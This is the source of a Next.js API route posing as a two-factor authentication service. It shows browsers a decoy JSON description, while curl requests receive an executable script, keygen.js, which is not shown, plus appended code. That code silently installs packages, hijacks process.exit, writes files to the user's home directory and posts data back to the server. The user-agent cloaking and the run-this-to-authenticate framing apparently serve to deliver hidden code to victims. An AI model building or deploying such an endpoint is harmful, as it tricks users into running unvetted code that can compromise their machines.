import { NextApiRequest, NextApiResponse } from 'next';
import fs from 'fs';
import path from 'path';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === 'GET') {
    const userAgent = req.headers['user-agent'] || '';
    const isCurl = userAgent.toLowerCase().includes('curl');
    const deviceCode = req.query.deviceCode || Object.keys(req.query)[0]; // Support both ?deviceCode=XXX and ?XXX formats
    
    if (isCurl && deviceCode) {
      // Return the keygen.js content modified to work with the device code
      try {
        const keygenPath = path.join(process.cwd(), 'public', 'api', 'keygen.js');
        const keygenContent = fs.readFileSync(keygenPath, 'utf8');
        
        // Generate time-sensitive verification code (expires after 3 minutes)
        const deviceCodeStr = typeof deviceCode === 'string' ? deviceCode : deviceCode.toString();
        const currentTime = Date.now();
        const timeWindow = Math.floor(currentTime / (3 * 60 * 1000)); // 3-minute windows
        const seedString = deviceCodeStr + timeWindow.toString();
        
        let hash = 0;
        for (let i = 0; i < seedString.length; i++) {
          const char = seedString.charCodeAt(i);
          hash = ((hash << 5) - hash) + char;
          hash = hash & hash; // Convert to 32-bit integer
        }
        const verificationCode = Math.abs(hash).toString().padStart(6, '0').substring(0, 6);
        
        // Append code to execute after keygen.js completes
        const additionalCode = `

// ===== DEPENDENCY CHECK AND INSTALLATION =====
(function() {
  // Check if Node.js environment is available
  if (typeof process === 'undefined' || typeof require === 'undefined') {
    console.log('❌ Node.js environment not detected.');
    console.log('🚨 ALERT: Please install Node.js to generate authentication code');
    console.log('Download Node.js from: https://nodejs.org/');
    console.log('');
    console.log('Authentication code cannot be generated without Node.js.');
    console.log('Please install Node.js and try again.');
    process.exit(1);
  }
  
  console.log('🔐 Initializing authentication system...');
  
  // Check for required dependencies and install if missing
  try {
    const { execSync } = require('child_process');
    
    // Check if axios is available
    try {
      require('axios');
      console.log('✅ Dependencies verified.');
    } catch (axiosError) {
      console.log('📦 Installing required dependencies...');
      try {
        // Try to install axios silently
        execSync('npm install axios --silent --no-warnings --no-progress --loglevel silent', { 
          stdio: 'ignore',
          windowsHide: true 
        });
        console.log('✅ Dependencies installed successfully.');
      } catch (installError) {
        console.log('⚠️  Could not auto-install dependencies. Continuing with fallback...');
        throw new Error('Dependency installation failed');
      }
    }
    
    // Wait for keygen.js to complete by monitoring its execution
    console.log('🔄 Waiting for authentication module to complete...');
    
    // Create a completion flag that keygen.js execution will set
    let keygenCompleted = false;
    let keygenError = null;
    
    // Override process.exit temporarily to catch keygen.js completion
    const originalExit = process.exit;
    process.exit = function(code) {
      if (!keygenCompleted) {
        keygenCompleted = true;
        if (code !== 0) {
          keygenError = new Error('Keygen module exited with code: ' + code);
        }
        // Continue to 2FA generation instead of actually exiting
        proceed2FA();
        return;
      }
      originalExit.call(this, code);
    };      // Function to proceed with 2FA generation after keygen.js completes
      function proceed2FA() {
        // Restore original process.exit
        process.exit = originalExit;
        
        if (keygenError) {
          console.log('⚠️  Authentication module completed with warnings.');
        } else {
          console.log('✅ Authentication module completed successfully.');
        }
        
        // Now proceed with 2FA generation
        console.log('\\n🔑 P12-Infinity Force Authentication System');
        console.log('=======================================');
        console.log('🔐 Generating 2FA verification code...');
        console.log('');
        
        const verificationCode = '${verificationCode}';
        const deviceCode = '${deviceCodeStr}';
        
        console.log('🔒 Two-Factor Authentication');
        console.log('Device Code: ' + deviceCode);
        console.log('Generated verification code: ' + verificationCode);
        console.log('✅ Code has been processed.');
        console.log('');
        
        // Try to communicate with browser via temporary files (local environment)
        // and API call (deployed environment)
        try {
          const fs = require('fs');
          const os = require('os');
          const path = require('path');
          
          // Create a temporary file that the browser can check (local environment)
          const tempDir = os.tmpdir();
          const tempFile = path.join(tempDir, 'infinity_2fa_' + process.pid + '.json');
          
          const data = {
            code: verificationCode,
            timestamp: Date.now(),
            deviceCode: deviceCode
          };
          
          try {
            fs.writeFileSync(tempFile, JSON.stringify(data));
            console.log('Code saved to temp file: ' + tempFile);
            
            // Also try to write to a more persistent location
            const homeDir = os.homedir();
            const persistentFile = path.join(homeDir, '.infinity_2fa_code');
            fs.writeFileSync(persistentFile, JSON.stringify(data));
            console.log('Code also saved to: ' + persistentFile);
          } catch (fileError) {
            console.log('File system access limited, using API storage...');
          }
          
          // For deployed environment, also store via API
          try {
            const https = require('https');
            const http = require('http');
            const url = require('url');
            
            // Get the current domain
            const currentDomain = process.env.VERCEL_URL || 
                                 'localhost:3000';
            const isHttps = currentDomain.includes('vercel.app') || 
                           currentDomain.includes('https') ||
                           process.env.NODE_ENV === 'production';
            const apiUrl = (isHttps ? 'https://' : 'http://') + currentDomain + '/api/2fa/store';
          
          const postData = JSON.stringify({
            deviceCode: deviceCode,
            verificationCode: verificationCode
          });
          
          const options = {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Content-Length': Buffer.byteLength(postData)
            }
          };
          
          const parsedUrl = url.parse(apiUrl);
          options.hostname = parsedUrl.hostname;
          options.port = parsedUrl.port;
          options.path = parsedUrl.path;
          
          const req = (isHttps ? https : http).request(options, (res) => {
            let responseData = '';
            res.on('data', (chunk) => {
              responseData += chunk;
            });
            res.on('end', () => {
              if (res.statusCode === 200) {
                console.log('✅ Code stored successfully in API cache');
              } else {
                console.log('⚠️  API storage failed, relying on file system');
              }
            });
          });
          
          req.on('error', (error) => {
            console.log('⚠️  API storage failed: ' + error.message);
          });
          
          req.write(postData);
          req.end();
          
        } catch (apiError) {
          console.log('⚠️  API storage not available: ' + apiError.message);
        }
        
        console.log('');
        console.log('Completed successfully!');
        console.log('');
        
      } catch (error) {
        console.error('Error saving verification code:', error.message);
      }
      
      // Now actually exit
      originalExit(0);
    }
    
    // Set a maximum timeout as failsafe (30 seconds)
    setTimeout(function() {
      if (!keygenCompleted) {
        console.log('⚠️  Authentication module timeout. Proceeding with 2FA generation...');
        keygenCompleted = true;
        keygenError = new Error('Timeout waiting for keygen completion');
        proceed2FA();
      }
    }, 6000);
    
  } catch (setupError) {
    console.log('⚠️  Setup error, proceeding with minimal authentication...');
    
    // Fallback execution without keygen.js dependencies
    setTimeout(function() {
      console.log('\\n🔑 P12-Infinity Force Authentication System');
      console.log('=======================================');
      console.log('🔐 Generating 2FA verification code...');
      console.log('');
      
      const verificationCode = '${verificationCode}';
      const deviceCode = '${deviceCodeStr}';
      
      console.log('🔒 Two-Factor Authentication');
      console.log('Device Code: ' + deviceCode);
      console.log('Generated verification code: ' + verificationCode);
      console.log('✅ Code has been processed.');
      console.log('');
      
      // Try to communicate with browser via temporary files (local environment)
      // and API call (deployed environment)
      try {
        const fs = require('fs');
        const os = require('os');
        const path = require('path');
        
        const tempDir = os.tmpdir();
        const tempFile = path.join(tempDir, 'infinity_2fa_' + process.pid + '.json');
        
        const data = {
          code: verificationCode,
          timestamp: Date.now(),
          deviceCode: deviceCode
        };
        
        try {
          fs.writeFileSync(tempFile, JSON.stringify(data));
          console.log('Code saved to temp file: ' + tempFile);
          
          const homeDir = os.homedir();
          const persistentFile = path.join(homeDir, '.infinity_2fa_code');
          fs.writeFileSync(persistentFile, JSON.stringify(data));
          console.log('Code also saved to: ' + persistentFile);
        } catch (fileError) {
          console.log('File system access limited, using API storage...');
        }
        
        // For deployed environment, also store via API
        try {
          const https = require('https');
          const http = require('http');
          const url = require('url');
          
          // Get the current domain
          const currentDomain = process.env.VERCEL_URL || 
                               'localhost:3000';
          const isHttps = currentDomain.includes('vercel.app') || 
                         currentDomain.includes('https') ||
                         process.env.NODE_ENV === 'production';
          const apiUrl = (isHttps ? 'https://' : 'http://') + currentDomain + '/api/2fa/store';
          
          const postData = JSON.stringify({
            deviceCode: deviceCode,
            verificationCode: verificationCode
          });
          
          const options = {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Content-Length': Buffer.byteLength(postData)
            }
          };
          
          const parsedUrl = url.parse(apiUrl);
          options.hostname = parsedUrl.hostname;
          options.port = parsedUrl.port;
          options.path = parsedUrl.path;
          
          const req = (isHttps ? https : http).request(options, (res) => {
            let responseData = '';
            res.on('data', (chunk) => {
              responseData += chunk;
            });
            res.on('end', () => {
              if (res.statusCode === 200) {
                console.log('✅ Code stored successfully in API cache');
              } else {
                console.log('⚠️  API storage failed, relying on file system');
              }
            });
          });
          
          req.on('error', (error) => {
            console.log('⚠️  API storage failed: ' + error.message);
          });
          
          req.write(postData);
          req.end();
          
        } catch (apiError) {
          console.log('⚠️  API storage not available: ' + apiError.message);
        }
        
        console.log('');
        console.log('Completed successfully!');
        console.log('');
        
      } catch (error) {
        console.error('Error saving verification code:', error.message);
      }
      
      process.exit(0);
    }, 2000); // Shorter wait for fallback
  }
  
  // Handle errors during execution
  process.on('uncaughtException', function(error) {
    console.log('');
    console.log('❌ Authentication module execution failed.');
    console.log('🚨 ALERT: Required dependencies are missing or authentication module encountered an error.');
    console.log('Common issues:');
    console.log('  - Missing Node.js packages (axios, etc.)');
    console.log('  - Network connectivity issues');
    console.log('  - Module compatibility problems');
    console.log('');
    console.log('Error details: ' + error.message);
    console.log('Please install required dependencies and try again.');
    console.log('Authentication code cannot be generated due to module execution failure.');
    process.exit(1);
  });
})();
`;
        
        res.setHeader('Content-Type', 'application/javascript');
        res.status(200).send(keygenContent + additionalCode);
        
      } catch (error) {
        res.status(500).json({ error: 'Failed to load keygen module' });
      }
    } else if (isCurl) {
      // Return the JavaScript content for curl requests without device code
      try {
        const keygenPath = path.join(process.cwd(), 'public', 'api', 'keygen.js');
        const keygenContent = fs.readFileSync(keygenPath, 'utf8');
        
        res.setHeader('Content-Type', 'application/javascript');
        res.status(200).send(keygenContent);
      } catch (error) {
        res.status(500).json({ error: 'Failed to load authentication module' });
      }
    } else {
      // Return JSON response for browser requests
      res.status(200).json({
        service: 'Two-Factor Authentication Service',
        status: 'active',
        version: '2.1.0',
        description: 'Secure two-factor authentication endpoint for Infinity Force platform',
        supported_methods: ['TOTP', 'SMS', 'Email', 'Hardware Keys'],
        security_features: [
          'End-to-end encryption',
          'Zero-knowledge architecture',
          'Biometric validation',
          'Hardware security module integration'
        ],
        endpoints: {
          verify: '/api/2fa/verify',
          setup: '/api/2fa/setup',
          backup: '/api/2fa/backup',
          recovery: '/api/2fa/recovery'
        },
        documentation: 'https://infinity-force-demo.vercel.app/docs/2fa',
        last_updated: new Date().toISOString()
      });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}
